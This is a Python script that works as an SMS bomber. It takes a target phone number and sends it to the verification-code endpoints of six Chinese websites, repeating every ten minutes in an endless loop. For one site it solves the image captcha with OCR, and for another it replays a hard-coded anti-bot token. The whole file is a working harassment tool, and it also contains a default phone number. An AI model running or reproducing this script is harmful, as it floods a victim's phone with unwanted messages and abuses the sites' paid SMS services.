import requests
from time import sleep
import json
import time
try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract

class text():

    def __init__(self):

        self.headers={

            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'
##            'X-Requested-With':'XMLHttpRequest'
            }

        self.session=requests.session()

        self.pic='code.png'

        self.mobile='13655000218'


    def page1(self):#超星

        headers={
'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,fr;q=0.6',
'Connection': 'keep-alive',
'Host': 'passport2.chaoxing.com',
'Referer': 'http://passport2.chaoxing.com/register3?refer=http%3A%2F%2Fi.mooc.chaoxing.com',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36',
'X-Requested-With': 'XMLHttpRequest'

            }

        r=requests.get('http://passport2.chaoxing.com/num/phonecode?phone='+self.mobile+'&needcode=false',headers=headers)
        
        print(r.text)

    def page2(self):#古诗网

        r=requests.get('https://so.gushiwen.org/user/phonecode.aspx?phoneNum='+self.mobile,headers=self.headers)

        print(r.text)

    def page3(self):#淘手游

        r=self.session.get('https://passport.taoshouyou.com/api/sms/captcha?refresh=1',headers=self.headers)

        l=self.session.get('https://passport.taoshouyou.com'+r.text[32:-2],headers=self.headers)

        with open(self.pic,'wb') as f:

            f.write(l.content)

            f.close()

        captcha=Image.open(self.pic)
        
        result=pytesseract.image_to_string(captcha)

        data={
            'mobile':self.mobile,
            'picVerifyCode':result,
            'sendType':'sms'
            }

        h=self.session.post('https://passport.taoshouyou.com/api/sms/register-code',headers=self.headers,data=data)

        print(h.text)

    def page4(self):#金杰士

        data={
            
        'mobile':self.mobile,
        
        'imageCode':''
        
            }

        r=self.session.post('http://www.jinyingjie.com/Home/login/sendPhoneCode',headers=self.headers,data=data)

        print(r.text)

    def page5(self):

        r=self.session.get('http://www.kaishustory.com/api/loginservice/getsmscode?mobile=3'+self.mobile[0]+'3'+self.mobile[1]+'3'+self.mobile[2]+'3'+self.mobile[3]+'3'+self.mobile[4]+'3'+self.mobile[5]+'3'+self.mobile[6]+'3'+self.mobile[7]+'3'+self.mobile[8]+'3'+self.mobile[9]+'3'+self.mobile[10],headers=self.headers)

        print(r.text)

    def page6(self):

        data={
'afs_token': "0#FFFF00000000016B410E1565178613753614336469611565271049859053G002EE0DE98A13B3452C740D8A716414A52697F",
'code': "",
'passAliAuth': 'true',
'passWeChatAuth': 'true',
'phone': self.mobile
            }

        headers={
'Accept': 'application/json',
'Content-Type': 'application/json',
'Origin': 'https://h5.leoao.com',
'Referer': 'https://h5.leoao.com/userLogin/login?f=https%3A%2F%2Fh5.leoao.com%2Fmultiple%2Fcoach%2Fcamp%2Fhome.html',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
'X-Requested-With': 'XMLHttpRequest',
            }

        r=self.session.post('https://auth.leoao.com/passport/send_sms_code',headers=headers,data=json.dumps(data))

        print(r.text)

        
if __name__=='__main__':

    t=text()

    t.mobile=input("请输入号码")


    while True:

        tt=[]

        for i in range(1,7):

            tt.append('t.page'+str(i)+'()')

        for x in tt:

            c=compile(x,'','exec')

            try:

                print(x)

                exec(c)

            except:

                print(x)

                pass

        #休息10分钟
        sleep(600)
